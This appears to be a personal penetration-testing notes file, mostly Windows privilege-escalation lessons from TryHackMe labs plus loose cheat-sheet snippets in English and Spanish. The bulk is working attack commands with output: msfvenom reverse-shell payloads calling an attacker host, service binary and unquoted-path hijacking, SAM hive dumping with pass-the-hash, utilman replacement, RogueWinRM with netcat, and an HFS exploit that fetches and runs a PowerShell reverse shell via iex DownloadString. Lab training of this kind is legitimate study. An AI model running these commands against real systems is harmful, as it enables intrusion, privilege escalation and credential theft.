This method requires two registry values to be set. You can query these from the command line using the commands below.
Command Prompt

C:\> reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
C:\> reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer

        

To be able to exploit this vulnerability, both should be set. Otherwise, exploitation will not be possible. If these are set, you can generate a malicious .msi file using msfvenom, as seen below:

msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_10.10.87.69 LPORT=LOCAL_PORT -f msi -o malicious.msi

As this is a reverse shell, you should also run the Metasploit Handler module configured accordingly. Once you have transferred the file you have created, you can run the installer with the command below and receive the reverse shell:
Command Prompt

C:\> msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi

-=-=-=-
Abusing Service Misconfigurations
Windows services are managed by the Service Control Manager (SCM). The SCM is a process in charge of managing the state of services as needed, checking the current status of any given service and generally providing a way to configure services.

Each service on a Windows machine will have an associated executable which will be run by the SCM whenever a service is started. It is important to note that service executables implement special functions to be able to communicate with the SCM, and therefore not any executable can be started as a service successfully. Each service also specifies the user account under which the service will run.

To better understand the structure of a service, let's check the apphostsvc service configuration with the sc qc command:

Command Prompt

C:\> sc qc apphostsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: apphostsvc
        TYPE               : 20  WIN32_SHARE_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : C:\Windows\system32\svchost.exe -k apphost
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Application Host Helper Service
        DEPENDENCIES       :
        SERVICE_START_NAME : localSystem

        

Here we can see that the associated executable is specified through the BINARY_PATH_NAME parameter, and the account used to run the service is shown on the SERVICE_START_NAME parameter.

Services have a Discretionary Access Control List (DACL), which indicates who has permission to start, stop, pause, query status, query configuration, or reconfigure the service, amongst other privileges. The DACL can be seen from Process Hacker (available on your machine's desktop):

Service DACL

All of the services configurations are stored on the registry under HKLM\SYSTEM\CurrentControlSet\Services\:

Service registry entries

A subkey exists for every service in the system. Again, we can see the associated executable on the ImagePath value and the account used to start the service on the ObjectName value. If a DACL has been configured for the service, it will be stored in a subkey called Security. As you have guessed by now, only administrators can modify such registry entries by default.


Insecure Permissions on Service Executable

If the executable associated with a service has weak permissions that allow an attacker to modify or replace it, the attacker can gain the privileges of the service's account trivially.

To understand how this works, let's look at a vulnerability found on Splinterware System Scheduler. To start, we will query the service configuration using sc:
Command Prompt

C:\> sc qc WindowsScheduler
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: windowsscheduler
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\PROGRA~2\SYSTEM~1\WService.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : System Scheduler Service
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcuser1

        

We can see that the service installed by the vulnerable software runs as svcuser1 and the executable associated with the service is in C:\Progra~2\System~1\WService.exe. We then proceed to check the permissions on the executable:
Command Prompt

C:\Users\thm-unpriv>icacls C:\PROGRA~2\SYSTEM~1\WService.exe
C:\PROGRA~2\SYSTEM~1\WService.exe Everyone:(I)(M)
                                  NT AUTHORITY\SYSTEM:(I)(F)
                                  BUILTIN\Administrators:(I)(F)
                                  BUILTIN\Users:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
                                  APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)

Successfully processed 1 files; Failed processing 0 files

        

And here we have something interesting. The Everyone group has modify permissions (M) on the service's executable. This means we can simply overwrite it with any payload of our preference, and the service will execute it with the privileges of the configured user account.

Let's generate an exe-service payload using msfvenom and serve it through a python webserver:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe

user@attackerpc$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...

        

We can then pull the payload from Powershell with the following command:
Powershell

wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe

        

Once the payload is in the Windows server, we proceed to replace the service executable with our payload. Since we need another user to execute our payload, we'll want to grant full permissions to the Everyone group as well:
Command Prompt

C:\> cd C:\PROGRA~2\SYSTEM~1\

C:\PROGRA~2\SYSTEM~1> move WService.exe WService.exe.bkp
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> move C:\Users\thm-unpriv\rev-svc.exe WService.exe
        1 file(s) moved.

C:\PROGRA~2\SYSTEM~1> icacls WService.exe /grant Everyone:F
        Successfully processed 1 files.

        

We start a reverse listener on our attacker machine:
Kali Linux

user@attackerpc$ nc -lvp 4445

        

And finally, restart the service. While in a normal scenario, you would likely have to wait for a service restart, you have been assigned privileges to restart the service yourself to save you some time. Use the following commands from a cmd.exe command prompt:
Command Prompt

C:\> sc stop windowsscheduler
C:\> sc start windowsscheduler

        

Note: PowerShell has sc as an alias to Set-Content, therefore you need to use sc.exe in order to control services with PowerShell this way.

As a result, you'll get a reverse shell with svcusr1 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4445
Listening on 0.0.0.0 4445
Connection received on 10.10.175.90 50649
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr1

        

Go to svcusr1 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Unquoted Service Paths

When we can't directly write into service executables as before, there might still be a chance to force a service into running arbitrary executables by using a rather obscure feature.

When working with Windows services, a very particular behaviour occurs when the service is configured to point to an "unquoted" executable. By unquoted, we mean that the path of the associated executable isn't properly quoted to account for spaces on the command.

As an example, let's look at the difference between two services (these services are used as examples only and might not be available in your machine). The first service will use a proper quotation so that the SCM knows without a doubt that it has to execute the binary file pointed by "C:\Program Files\RealVNC\VNC Server\vncserver.exe", followed by the given parameters:
Command Prompt

C:\> sc qc "vncserver"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: vncserver
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : "C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : VNC Server
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

        

Remember: PowerShell has 'sc' as an alias to 'Set-Content', therefore you need to use 'sc.exe' to control services if you are in a PowerShell prompt.
Now let's look at another service without proper quotation:
Command Prompt

C:\> sc qc "disk sorter enterprise"
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: disk sorter enterprise
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 2   AUTO_START
        ERROR_CONTROL      : 0   IGNORE
        BINARY_PATH_NAME   : C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : Disk Sorter Enterprise
        DEPENDENCIES       :
        SERVICE_START_NAME : .\svcusr2

        

When the SCM tries to execute the associated binary, a problem arises. Since there are spaces on the name of the "Disk Sorter Enterprise" folder, the command becomes ambiguous, and the SCM doesn't know which of the following you are trying to execute:
Command	Argument 1	Argument 2
C:\MyPrograms\Disk.exe	Sorter	Enterprise\bin\disksrs.exe
C:\MyPrograms\Disk Sorter.exe	Enterprise\bin\disksrs.exe	
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe		


This has to do with how the command prompt parses a command. Usually, when you send a command, spaces are used as argument separators unless they are part of a quoted string. This means the "right" interpretation of the unquoted command would be to execute C:\\MyPrograms\\Disk.exe and take the rest as arguments.

Instead of failing as it probably should, SCM tries to help the user and starts searching for each of the binaries in the order shown in the table:

    First, search for C:\\MyPrograms\\Disk.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter.exe. If it exists, the service will run this executable.
    If the latter doesn't exist, it will then search for C:\\MyPrograms\\Disk Sorter Enterprise\\bin\\disksrs.exe. This option is expected to succeed and will typically be run in a default installation.

From this behaviour, the problem becomes evident. If an attacker creates any of the executables that are searched for before the expected service executable, they can force the service to run an arbitrary executable.

While this sounds trivial, most of the service executables will be installed under C:\Program Files or C:\Program Files (x86) by default, which isn't writable by unprivileged users. This prevents any vulnerable service from being exploited. There are exceptions to this rule: - Some installers change the permissions on the installed folders, making the services vulnerable. - An administrator might decide to install the service binaries in a non-default path. If such a path is world-writable, the vulnerability can be exploited.

In our case, the Administrator installed the Disk Sorter binaries under c:\MyPrograms. By default, this inherits the permissions of the C:\ directory, which allows any user to create files and folders in it. We can check this using icacls:
Command Prompt

C:\>icacls c:\MyPrograms
c:\MyPrograms NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
              BUILTIN\Administrators:(I)(OI)(CI)(F)
              BUILTIN\Users:(I)(OI)(CI)(RX)
              BUILTIN\Users:(I)(CI)(AD)
              BUILTIN\Users:(I)(CI)(WD)
              CREATOR OWNER:(I)(OI)(CI)(IO)(F)

Successfully processed 1 files; Failed processing 0 files

        

The BUILTIN\\Users group has AD and WD privileges, allowing the user to create subdirectories and files, respectively.

The process of creating an exe-service payload with msfvenom and transferring it to the target host is the same as before, so feel free to create the following payload and upload it to the server as before. We will also start a listener to receive the reverse shell when it gets executed:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe

user@attackerpc$ nc -lvp 4446

        

Once the payload is in the server, move it to any of the locations where hijacking might occur. In this case, we will be moving our payload to C:\MyPrograms\Disk.exe. We will also grant Everyone full permissions on the file to make sure it can be executed by the service:
Command Prompt

C:\> move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe

C:\> icacls C:\MyPrograms\Disk.exe /grant Everyone:F
        Successfully processed 1 files.

        

Once the service gets restarted, your payload should execute:
Command Prompt

C:\> sc stop "disk sorter enterprise"
C:\> sc start "disk sorter enterprise"

        

As a result, you'll get a reverse shell with svcusr2 privileges:
Kali Linux

user@attackerpc$ nc -lvp 4446
Listening on 0.0.0.0 4446
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
wprivesc1\svcusr2

        

Go to svcusr2 desktop to retrieve a flag. Don't forget to input the flag at the end of this task.


Insecure Service Permissions

You might still have a slight chance of taking advantage of a service if the service's executable DACL is well configured, and the service's binary path is rightly quoted. Should the service DACL (not the service's executable DACL) allow you to modify the configuration of a service, you will be able to reconfigure the service. This will allow you to point to any executable you need and run it with any account you prefer, including SYSTEM itself.

To check for a service DACL from the command line, you can use Accesschk from the Sysinternals suite. For your convenience, a copy is available at C:\\tools. The command to check for the thmservice service DACL is:
Command Prompt

C:\tools\AccessChk> accesschk64.exe -qlc thmservice
  [0] ACCESS_ALLOWED_ACE_TYPE: NT AUTHORITY\SYSTEM
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_PAUSE_CONTINUE
        SERVICE_START
        SERVICE_STOP
        SERVICE_USER_DEFINED_CONTROL
        READ_CONTROL
  [4] ACCESS_ALLOWED_ACE_TYPE: BUILTIN\Users
        SERVICE_ALL_ACCESS

        

Here we can see that the BUILTIN\\Users group has the SERVICE_ALL_ACCESS permission, which means any user can reconfigure the service.

Before changing the service, let's build another exe-service reverse shell and start a listener for it on the attacker's machine:
Kali Linux

user@attackerpc$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe

user@attackerpc$ nc -lvp 4447

        

We will then transfer the reverse shell executable to the target machine and store it in C:\Users\thm-unpriv\rev-svc3.exe. Feel free to use wget to transfer your executable and move it to the desired location. Remember to grant permissions to Everyone to execute your payload:
Command Prompt

C:\> icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F

        

To change the service's associated executable and account, we can use the following command (mind the spaces after the equal signs when using sc.exe):
Command Prompt

C:\> sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem

        

Notice we can use any account to run the service. We chose LocalSystem as it is the highest privileged account available. To trigger our payload, all that rests is restarting the service:
Command Prompt

C:\> sc stop THMService
C:\> sc start THMService

        

And we will receive a shell back in our attacker's machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4447
Listening on 0.0.0.0 4447
Connection received on 10.10.175.90 50650
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
NT AUTHORITY\SYSTEM

-=-=-=
Abusing dangerous privileges
Windows Privileges

Privileges are rights that an account has to perform specific system-related tasks. These tasks can be as simple as the privilege to shut down the machine up to privileges to bypass some DACL-based access controls.

Each user has a set of assigned privileges that can be checked with the following command:

whoami /priv

A complete list of available privileges on Windows systems is available here. From an attacker's standpoint, only those privileges that allow us to escalate in the system are of interest. You can find a comprehensive list of exploitable privileges on the Priv2Admin Github project.

While we won't take a look at each of them, we will showcase how to abuse some of the most common privileges you can find.


SeBackup / SeRestore

The SeBackup and SeRestore privileges allow users to read and write to any file in the system, ignoring any DACL in place. The idea behind this privilege is to allow certain users to perform backups from a system without requiring full administrative privileges.

Having this power, an attacker can trivially escalate privileges on the system by using many techniques. The one we will look at consists of copying the SAM and SYSTEM registry hives to extract the local Administrator's password hash.

Log in to the target machine via RDP using the following credentials:

User: THMBackup

Password: CopyMaster555

This account is part of the "Backup Operators" group, which by default is granted the SeBackup and SeRestore privileges. We will need to open a command prompt using the "Open as administrator" option to use these privileges. We will be asked to input our password again to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege            Restore files and directories  Disabled
SeShutdownPrivilege           Shut down the system           Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

        

To backup the SAM and SYSTEM hashes, we can use the following commands:
Command Prompt

C:\> reg save hklm\system C:\Users\THMBackup\system.hive
The operation completed successfully.

C:\> reg save hklm\sam C:\Users\THMBackup\sam.hive
The operation completed successfully.

        

This will create a couple of files with the registry hives content. We can now copy these files to our attacker machine using SMB or any other available method. For SMB, we can use impacket's smbserver.py to start a simple SMB server with a network share in the current directory of our AttackBox:
Kali Linux

user@attackerpc$ mkdir share
user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
        

This will create a share named public pointing to the share directory, which requires the username and password of our current windows session. After this, we can use the copy command in our windows machine to transfer both files to our AttackBox: 
Command Prompt

C:\> copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
C:\> copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\

        

And use impacket to retrieve the users' password hashes:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::


        

We can finally use the Administrator's hash to perform a Pass-the-Hash attack and gain access to the target machine with SYSTEM privileges:
Kali Linux

user@attackerpc$ python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.199.94
Impacket v0.9.24.dev1+20210704.162046.29ad5792 - Copyright 2021 SecureAuth Corporation

[*] Requesting shares on 10.10.175.90.....
[*] Found writable share ADMIN$
[*] Uploading file nfhtabqO.exe
[*] Opening SVCManager on 10.10.175.90.....
[*] Creating service RoLE on 10.10.175.90.....
[*] Starting service RoLE.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
        


SeTakeOwnership

The SeTakeOwnership privilege allows a user to take ownership of any object on the system, including files and registry keys, opening up many possibilities for an attacker to elevate privileges, as we could, for example, search for a service running as SYSTEM and take ownership of the service's executable. For this task, we will be taking a different route, however.

Log in to the target machine via RDP using the following credentials:

User: THMTakeOwnership

Password: TheWorldIsMine2022

To get the SeTakeOwnership privilege, we need to open a command prompt using the "Open as administrator" option. We will be asked to input our password to get an elevated console:

Run as admin

Once on the command prompt, we can check our privileges with the following command:
Command Prompt

C:\> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                              State
============================= ======================================== ========
SeTakeOwnershipPrivilege      Take ownership of files or other objects Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                 Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set           Disabled

        

We'll abuse utilman.exe to escalate privileges this time. Utilman is a built-in Windows application used to provide Ease of Access options during the lock screen:

utilman normal behaviour

Since Utilman is run with SYSTEM privileges, we will effectively gain SYSTEM privileges if we replace the original binary for any payload we like. As we can take ownership of any file, replacing it is trivial.

To replace utilman, we will start by taking ownership of it with the following command:
Command Prompt

C:\> takeown /f C:\Windows\System32\Utilman.exe

SUCCESS: The file (or folder): "C:\Windows\System32\Utilman.exe" now owned by user "WINPRIVESC2\thmtakeownership".

        

Notice that being the owner of a file doesn't necessarily mean that you have privileges over it, but being the owner you can assign yourself any privileges you need. To give your user full permissions over utilman.exe you can use the following command:
Command Prompt

C:\> icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
processed file: Utilman.exe
Successfully processed 1 files; Failed processing 0 files

        

After this, we will replace utilman.exe with a copy of cmd.exe:
Command Prompt

C:\Windows\System32\> copy cmd.exe utilman.exe
        1 file(s) copied.

        

To trigger utilman, we will lock our screen from the start button:

lock screen

And finally, proceed to click on the "Ease of Access" button, which runs utilman.exe with SYSTEM privileges. Since we replaced it with a cmd.exe copy, we will get a command prompt with SYSTEM privileges:

utilman shell


SeImpersonate / SeAssignPrimaryToken

These privileges allow a process to impersonate other users and act on their behalf. Impersonation usually consists of being able to spawn a process or thread under the security context of another user.

Impersonation is easily understood when you think about how an FTP server works. The FTP server must restrict users to only access the files they should be allowed to see.

Let's assume we have an FTP service running with user ftp. Without impersonation, if user Ann logs into the FTP server and tries to access her files, the FTP service would try to access them with its access token rather than Ann's:

FTP server without impersonation

There are several reasons why using ftp's token is not the best idea: - For the files to be served correctly, they would need to be accessible to the ftp user. In the example above, the FTP service would be able to access Ann's files, but not Bill's files, as the DACL in Bill's files doesn't allow user ftp. This adds complexity as we must manually configure specific permissions for each served file/directory. - For the operating system, all files are accessed by user ftp, independent of which user is currently logged in to the FTP service. This makes it impossible to delegate the authorisation to the operating system; therefore, the FTP service must implement it. - If the FTP service were compromised at some point, the attacker would immediately gain access to all of the folders to which the ftp user has access.

If, on the other hand, the FTP service's user has the SeImpersonate or SeAssignPrimaryToken privilege, all of this is simplified a bit, as the FTP service can temporarily grab the access token of the user logging in and use it to perform any task on their behalf:

FTP server with impersonation

Now, if user Ann logs in to the FTP service and given that the ftp user has impersonation privileges, it can borrow Ann's access token and use it to access her files. This way, the files don't need to provide access to user ftp in any way, and the operating system handles authorisation. Since the FTP service is impersonating Ann, it won't be able to access Jude's or Bill's files during that session.

As attackers, if we manage to take control of a process with SeImpersonate or SeAssignPrimaryToken privileges, we can impersonate any user connecting and authenticating to that process.

In Windows systems, you will find that the LOCAL SERVICE and NETWORK SERVICE ACCOUNTS already have such privileges. Since these accounts are used to spawn services using restricted accounts, it makes sense to allow them to impersonate connecting users if the service needs. Internet Information Services (IIS) will also create a similar default account called "iis apppool\defaultapppool" for web applications.

To elevate privileges using such accounts, an attacker needs the following: 1. To spawn a process so that users can connect and authenticate to it for impersonation to occur. 2. Find a way to force privileged users to connect and authenticate to the spawned malicious process.

We will use RogueWinRM exploit to accomplish both conditions.

Let's start by assuming we have already compromised a website running on IIS and that we have planted a web shell on the following address:

http://10.10.199.94/

We can use the web shell to check for the assigned privileges of the compromised account and confirm we hold both privileges of interest for this task:

Webshell impersonate privileges

To use RogueWinRM, we first need to upload the exploit to the target machine. For your convenience, this has already been done, and you can find the exploit in the C:\tools\ folder.

The RogueWinRM exploit is possible because whenever a user (including unprivileged users) starts the BITS service in Windows, it automatically creates a connection to port 5985 using SYSTEM privileges. Port 5985 is typically used for the WinRM service, which is simply a port that exposes a Powershell console to be used remotely through the network. Think of it like SSH, but using Powershell.

If, for some reason, the WinRM service isn't running on the victim server, an attacker can start a fake WinRM service on port 5985 and catch the authentication attempt made by the BITS service when starting. If the attacker has SeImpersonate privileges, he can execute any command on behalf of the connecting user, which is SYSTEM.

Before running the exploit, we'll start a netcat listener to receive a reverse shell on our attacker's machine:
Kali Linux

user@attackerpc$ nc -lvp 4442

        

And then, use our web shell to trigger the RogueWinRM exploit using the following command:

c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"

RogueWinRM exploit execution

Note: The exploit may take up to 2 minutes to work, so your browser may appear as unresponsive for a bit. This happens if you run the exploit multiple times as it must wait for the BITS service to stop before starting it again. The BITS service will stop automatically after 2 minutes of starting.

The -p parameter specifies the executable to be run by the exploit, which is nc64.exe in this case. The -a parameter is used to pass arguments to the executable. Since we want nc64 to establish a reverse shell against our attacker machine, the arguments to pass to netcat will be -e cmd.exe ATTACKER_IP 4442.

If all was correctly set up, you should expect a shell with SYSTEM privileges:
Kali Linux

user@attackerpc$ nc -lvp 4442
Listening on 0.0.0.0 4442
Connection received on 10.10.175.90 49755
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

c:\windows\system32\inetsrv>whoami
nt authority\system

        

Using any of the three methods discussed in this task, gain access to the Administrator's desktop and collect the flag. Don't forget to input the flag at the end of this task.

-=-=-
automated tools 
WinPEAS

WinPEAS is a script developed to enumerate the target system to uncover privilege escalation paths. You can find more information about winPEAS and download either the precompiled executable or a .bat script. WinPEAS will run commands similar to the ones listed in the previous task and print their output. The output from winPEAS can be lengthy and sometimes difficult to read. This is why it would be good practice to always redirect the output to a file, as shown below:
Command Prompt

           
C:\> winpeas.exe > outputfile.txt

        

WinPEAS can be downloaded here.


PrivescCheck

PrivescCheck is a PowerShell script that searches common privilege escalation on the target system. It provides an alternative to WinPEAS without requiring the execution of a binary file.

PrivescCheck can be downloaded here.

Reminder: To run PrivescCheck on the target system, you may need to bypass the execution policy restrictions. To achieve this, you can use the Set-ExecutionPolicy cmdlet as shown below.
Powershell

           
PS C:\> Set-ExecutionPolicy Bypass -Scope process -Force
PS C:\> . .\PrivescCheck.ps1
PS C:\> Invoke-PrivescCheck

        


WES-NG: Windows Exploit Suggester - Next Generation

Some exploit suggesting scripts (e.g. winPEAS) will require you to upload them to the target system and run them there. This may cause antivirus software to detect and delete them. To avoid making unnecessary noise that can attract attention, you may prefer to use WES-NG, which will run on your attacking machine (e.g. Kali or TryHackMe AttackBox).

WES-NG is a Python script that can be found and downloaded here.

Once installed, and before using it, type the wes.py --update command to update the database. The script will refer to the database it creates to check for missing patches that can result in a vulnerability you can use to elevate your privileges on the target system.

To use the script, you will need to run the systeminfo command on the target system. Do not forget to direct the output to a .txt file you will need to move to your attacking machine.

Once this is done, wes.py can be run as follows;
Kali Linux

user@kali$ wes.py systeminfo.txt


Metasploit

If you already have a Meterpreter shell on the target system, you can use the multi/recon/local_exploit_suggester module to list vulnerabilities that may affect the target system and allow you to elevate your privileges on the target system.


-=-=-=-=-=

gobuster dir -u http://<ip>:3333 -w <word list location>
GoBuster flag	Description
-e	Print the full URLs in your console
-u	The target URL
-w	Path to your wordlist
-U and -P	Username and Password for Basic Auth
-p <x>	Proxy to use for requests
-c <http cookies>	Specify a cookie for simulating your auth


-=-=-=-=-=
Samba Scan
Samba is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system.

Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <ip>
nmap --script=smb-enum* >ip-addr< -oN smb_enum.nmap
#Other version being --scripts_file a file created by me
❯ nmap --script-args-file=scripts_file 10.10.175.107 -oN final
Vulnerable scan
nmap --script vuln -p 22,80,139,445,8009,8080 <ip>

-=-=-=-=-==
smbclient 
Send a message to the machine name pc04
  net send pc04 hi there
  smbclient -M

-=-=-=


List shares
  smbclient -L //bigserve -U usermark
  and the system would prompt me for a password. Alternatively, I could type
  smbclient -L //Bigserve -U Usermark%swordfish

##Ir a la ruta del recurso compartido y tirar de un aspx-reverse-shell 
  https://raw.githubusercontent.com/borjmz/aspx-reverse-shell/master/shell.aspx
psexec.py user:'password'@10.10.32.51

Lcd specifies the default directory on your workstation—the directory in which smbclient looks for the files you want to send and puts the files you've received. Cd specifies the default directory for the server. So, if you're connected to a share that contains a directory named mail, from which you want to copy some files to a directory named /mymailfiles on your local Linux box, you can set those directories as the default directories by typing

  cd mail
  lcd /mymailfiles

Here's one final hint about using smbclient. Sometime you might need to use smbclient on someone else's Linux system. If the system's owner has never used smbclient and hasn't created the smb.conf file, Linux can't check smb.conf for the WINS server's location, and consequently smbclient often can't find the Win2K or NT server that you're trying to connect to. (For an explanation of the smb.conf file, see "Connecting Linux Workstations to Windows 2000 and NT Servers.")

You can, of course, create an smb.conf file. But if you don't want to do that much work, you can lead smbclient by the nose to your Win2K or NT server with the -W and -I options. The -W option lets you enter a domain's name, and the -I option lets you specify the server's IP address. So, using my earlier example, if I knew that \\BIGSERVE had an IP address of 200.200.200.10 and that my usermark account was in the domain GUYS, I could invoke smbclient with the command

smbclient //bigserve/plans -I   200.200.200.10 -W guys -U usermark%swordfish
Download recursively
  smbget -R smb://10.10.175.107/Anonymous

#]#]#]#]Pending 
mkdir /mnt/kenobiNFS
mount machine_ip:/var /mnt/kenobiNFS
ls -la /mnt/kenobiNFS
--=-=-=-=-=-=
searchsploit 
searchsploit -t java #Por titulo
searchsploit -p 39166 #Copia al portapapeles
searchsploit -m 39166 #Ademas copia al directorio actual 
searchsploit -x 39166 #Examinar
searchsploit -x --nmap resultado.xml
searchsploit ubuntu 14.04 -w #Busqueda en exploit.db 
searchsploit ubuntu 14.10 -w --exclude="Linux Kernel"
searchsploit -c ProFTPD 1.3.5 #Case sensitive
-=-=-=-=-=-=-=
HFS (testing)
In the GET parameter
/?search=%00{.exec|C%3a\Windows\System32\WindowsPowerShell\v1.0\powershell.exe+ping+10.10.14.10.}
listen with tcpdump -i tun0 icmp
powershell iex (New-Object Net.WebClient).DownloadString('http://<yourwebserver>/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress [IP] -Port [PortNo.]
#URL encode the payload
#Transfer files from Windows to Linux. If we are using cmd
powershell -c "Invoke-WebRequest -Uri 'http://10.8.50.72:8000/winPEAS.bat' -OutFile 'C:\Users\bill\Desktop\winpeas.bat'"
powershell -c wget "http://10.10.118.24/winPEAS.exe" -outfile "winPEAS.exe"
#Windows escalation privilege 
  PS C:\Users\bill\Downloads> . .\PowerUp.ps1
  PS C:\Users\bill\Downloads> Invoke-AllChecks
-=-=-=-=-=-=-=-
Web Hacking

#View source code
Links to different pages in HTML are written in anchor tags ( these are HTML elements that start with <a ), and the link that you'll be directed to is stored in the href attribute.

#Against a paywall
The style we're interested in is the display: block. If you click on the word block, you can type a value of your own choice. Try typing none, and this will make the box disappear, revealing the content underneath it and a flag. If the element didn't have a display field, you could click below the last style and add in your own

#Using breakpoints
This little bit of JavaScript is what is removing the red popup from the page. We can utilise another feature of debugger called breakpoints. These are points in the code that we can force the browser to stop processing the JavaScript and pause the current execution.

#Robots.txt
The robots.txt file is a document that tells search engines which pages they are and aren't allowed to show on their search engine results or ban specific search engines from crawling the website altogether. It can be common practice to restrict certain website areas so they aren't displayed in search engine results. These pages may be areas such as administration portals or files meant for the website's customers. This file gives us a great list of locations on the website that the owners don't want us to discover as penetration testers.

#Sitemap.xml
Unlike the robots.txt file, which restricts what search engine crawlers can look at, the sitemap.xml file gives a list of every file the website owner wishes to be listed on a search engine. These can sometimes contain areas of the website that are a bit more difficult to navigate to or even list some old webpages that the current site no longer uses but are still working behind the scenes.

#favicon
do a curl to compare the hash against OWASP favicon database (https://wiki.owasp.org/index.php/OWASP_favicon_database)
curl https://static-labs.tryhackme.cloud/sites/favicon/images/favicon.ico | md5sum

#HTTP headers
curl http://10.10.125.127 -I

#OSINT
Filter
	Example
	Description

site
	site:tryhackme.com
	returns results only from the specified website address
        -site:www.tryhackme.com
        exclude any links to www.tryhackme.com. It shows us only subdomain names belonging to domain.com

inurl
	inurl:admin
	returns results that have the specified word in the URL

filetype
	filetype:pdf
	returns results which are a particular file extension

intitle
	intitle:admin
	returns results that contain the specified word in the title

others
inurl:"ViewerFrame?Mode=" will find public web cameras.
